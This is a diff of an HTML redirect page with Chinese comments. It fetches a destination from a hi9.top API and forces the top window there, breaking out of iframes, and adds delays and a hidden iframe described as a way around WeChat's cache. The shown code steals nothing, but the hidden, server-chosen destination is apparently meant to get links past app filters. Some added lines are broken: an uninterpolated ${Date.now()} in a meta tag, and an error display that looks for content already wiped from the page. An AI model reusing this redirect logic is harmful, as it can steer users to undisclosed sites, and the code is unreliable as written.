@@ -4,20 +4,21 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 强制禁用缓存 - 解决微信等浏览器缓存问题 -->
+    <!-- 强制禁用浏览器缓存 -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
+    <!-- 备用刷新机制 -->
+    <meta http-equiv="refresh" content="10;url=https://hi9.top/qs_github/api.php?token=1&_=${Date.now()}">
     <title>跳转中...</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Microsoft YaHei", sans-serif;
+            font-family: 'Microsoft YaHei', sans-serif;
             background-color: #f8f8f8;
             color: #333;
             text-align: center;
             padding: 50px 20px;
             margin: 0;
-            -webkit-text-size-adjust: 100%;
         }
         .loading {
             font-size: 18px;
@@ -37,79 +38,97 @@
             color: #e74c3c;
             margin-top: 20px;
         }
-        .retry-btn {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background: #3498db;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
+        .contact {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #7f8c8d;
         }
     </style>
 </head>
 <body>
     <div id="content">
-        <div class="loading">正在跳转，请稍候...</div>
+        <div class="loading">正在准备精彩内容</div>
     </div>
 
     <script>
         // 获取URL参数
         function getQueryParam(name) {
-            var params = new URLSearchParams(window.location.search);
+            const params = new URLSearchParams(window.location.search);
             return params.get(name);
         }
 
         // 添加随机参数防止缓存
         function addCacheBuster(url) {
-            return url + (url.indexOf('?') > -1 ? '&' : '?') + '_=' + Date.now();
+            const separator = url.includes('?') ? '&' : '?';
+            return `${url}${separator}_=${Date.now()}`;
+        }
+
+        // 获取跳转链接
+        async function fetchRedirectUrl() {
+            const token = getQueryParam('token') || '1'; // 默认token=1
+            const apiUrl = addCacheBuster(`https://hi9.top/qs_github/api.php?token=${token}`);
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    cache: 'no-store',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP错误! 状态码: ${response.status}`);
+                }
+
+                const data = await response.json();
+
+                if (!data || !data.url) {
+                    throw new Error('服务器返回无效数据');
+                }
+
+                // 使用 window.top.location 保证跳出 iframe
+                const finalUrl = addCacheBuster(data.url);
+                window.top.location.replace(finalUrl);
+
+            } catch (error) {
+                console.error('跳转失败:', error);
+                showError(`内容加载失败: ${error.message}`);
+            }
         }
 
         // 显示错误信息
         function showError(message) {
-            document.getElementById('content').innerHTML = [
-                '<div class="error">' + message + '</div>',
-                '<button class="retry-btn" onclick="window.location.reload()">重新加载</button>'
-            ].join('');
+            document.getElementById('content').innerHTML = `
+                <div class="error">${message}</div>
+                <div class="contact">如有问题请联系客服</div>
+                <button onclick="window.location.reload()" style="
+                    margin-top: 20px;
+                    padding: 8px 20px;
+                    background: #3498db;
+                    color: white;
+                    border: none;
+                    border-radius: 4px;
+                    cursor: pointer;
+                ">重新加载</button>
+            `;
         }
 
-        // 主跳转函数
-        function performRedirect() {
-            // 获取token参数，默认为1
-            var token = getQueryParam('token') || '1';
-            
-            // 构建API请求URL
-            var apiUrl = addCacheBuster('https://hi9.top/qs_github/api.php?token=' + token);
-            
-            // 使用fetch获取跳转链接
-            fetch(apiUrl, {
-                method: 'GET',
-                mode: 'cors',
-                cache: 'no-store',
-                credentials: 'omit'
-            })
-            .then(function(response) {
-                if (!response.ok) {
-                    throw new Error('网络响应不正常，状态码: ' + response.status);
-                }
-                return response.json();
-            })
-            .then(function(data) {
-                if (!data || !data.url) {
-                    throw new Error('服务器返回无效数据');
-                }
-                
-                // 跳转到目标URL，并添加缓存破坏参数
-                window.location.replace(addCacheBuster(data.url));
-            })
-            .catch(function(error) {
-                console.error('跳转失败:', error);
-                showError('跳转失败: ' + error.message);
-            });
-        }
+        // 页面加载后立即执行
+        document.addEventListener('DOMContentLoaded', () => {
+            // 防止微信浏览器缓存页面，先清空内容
+            document.body.innerHTML = '';
 
-        // 使用window.onload确保页面完全加载后执行跳转
-        window.onload = performRedirect;
+            // 创建 iframe 用于微信缓存绕过
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'about:blank';
+            document.body.appendChild(iframe);
+
+            // 延迟执行跳转以避开缓存
+            setTimeout(fetchRedirectUrl, 500);
+        });
     </script>
 </body>
 </html>
